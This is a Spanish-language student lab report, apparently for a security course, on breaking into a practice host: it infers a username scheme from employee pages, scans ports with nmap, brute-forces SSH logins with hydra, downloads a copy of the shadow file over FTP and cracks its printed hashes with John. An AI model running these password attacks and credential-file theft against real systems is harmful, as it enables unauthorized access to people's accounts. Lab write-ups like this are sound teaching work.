# Informe FSI Laboratorio 2

## primera parte -segunda pregunta

Observando la información que la empresa publica sobre los empleados, ¿qué puede deducir sobre la política para la asignación de nombres de usuarios de la empresa?

Diego Hernancute AGUIRRE--> daguirre

Notemos que revisando en "listadopersonal.html" vimos que habia 'personal' que no tenia usuarios en el entonrno., se habia probado originalmente con una lista de usuarios para el ataque de hydra conformado por la primera letra del nombre y el apellido en minusculas, tambien se tuvo en cuenta, variaciones y truncaciones del mismo


## crackeo de contrasenas

Lo primero que se hizo al ingresar a la maquina fue ejecutar:

```bash
nmap 10.0.3.5
```

de esta manera se hizo un reconocimiento de puertos y ver que servicios estan activos, dandonos:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-21 19:54 UTC
Nmap scan report for 10.0.3.5
Host is up (0.00018s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Luego, descargamos todo lo que nos podia ofrecer el puerto 80, y se descargo todo el contenido brindado por el mismo, que era:
```
├── css
│  └── estilos.css
├── empleados.html
├── index.html
└── quienes-somos.html
```

Entonces luego de tener la lista de usuarios confeccionada (utilzando tanto "listadopersonal.html" como  "empleados.html"), lo que hicimos fue probar las contrasenas mas simples que conocimaos.., para esto se ejecuto desde la maquina atacante con:

```
hydra -L usuarios.txt -P contrasenas_faciles.txt ssh://10.0.3.5 -t 4 -w 1.2  -o hydra_test.txt
```

donde el parametro -L es para que use los usarios de usuarios.txt y el paraametro -P es para que por cada usuario pruebe cada contrasena en contrasenas_faciles.txt, despues se le dice donde atacar ssh://10.0.3.5, y despues `-t 4 -w 1.2` le digo que genere 4 threads, y que cada thread espera 1.2 segundos, estos parametros ayudaron a acelerar el proceso de ataque , hasta 240 intentos por minuto, luego `-o hydra_test.txt` es para que guarde las creedenciales encontradas.


Al principio se probo con el diccionario que nos dieron, pero resulto ser muy masivo, enotnces se eligio un aproach por contrasenas obias como:


````
adminadmin
admin
root
pass
password

123
````

y al fin se dio con el primer usuario, mre:123, que tenia la shell bloqueada, y el ftp, luego, lo que se hizo fue probar usuario=contrasena,y el comando:

```
hydra -C credenciales.txt ssh://10.0.3.5
```

y con eso se encontro el segundo usuario surreta:surreta,  y con este se descargo en el ftp una compia del shadow, lo que nos permitio usar john the reaper y saber de manera efectiva los usuarios que tenian contrasena en el sistema

```
surreta:$6$rqxwyesc$zAsBVpUSb3cyK1JsSm4MKJmTyiSyKWGQONjgfiIpNKVMqhmcd9uqnmihV.wVd3YgEIBtnL23GnQg5iLanjiyx1:20583:0:99999:7:::
mre:$6$ifvbkleu$NGuWC2Z/At3FfpLBb//yPawIGzcFop2eVjMiTmAXyHvryxQbIuslyfQHuN5v7E60oPSyXXua2Kw.158RYTKv4/:20583:0:99999:7:::
daguirre:$6$icsqorkb$Pi9g/LW7LpYzBbswIjVSagqTp9traSPfgNX5eGeazHUL5.SsIH/7TBBLRp.pbfmzBqYB/UDgMOZEBt1Ipis8y1:20583:0:99999:7:::
nmacgarry:$6$xcbhakri$hCA9R0ydm2Q3hyN6J5isohAC5rF0o.wTrNtSTklxuLrO/tyvB4nRAE2PjMbMwuALsiRrwSEIbrZiyr3av43q31:20583:0:99999:7:::
jadrover:$6$bawnjosp$5dVs4qNdpYBbHh3/YaqGiRkpzq6yTkumTj695S4OAADXgZffcG76DEpkxeVBLtYF2NVDJi4S6Gpf5LNyG77kT.:20583:0:99999:7:::
root:$6$yusvwqkt$XGlTL1BfevHD5VHtYKDvJh14vRa48VgRX5QfjEVo9KD53Zs5IRi5iM8/H9X7dnVQmDsBoJSIs/Xq2SSGbSoB.1:20583:0:99999:7:::
```

y con estos usuarios, probamos con el diccionario del curso, y encontramos las credenciales para `daguirre:contratreta`, gracias a esto se pudo acceder a una shell... empezando asi la segunda parte

para el resto de usarios, se lo documento dentro de `usuarios.txt`

-----

nota:
- ubuntu, en el shadow que teniamos aparecia con !, es decir , cuenta bloqueada, como muchas otras. 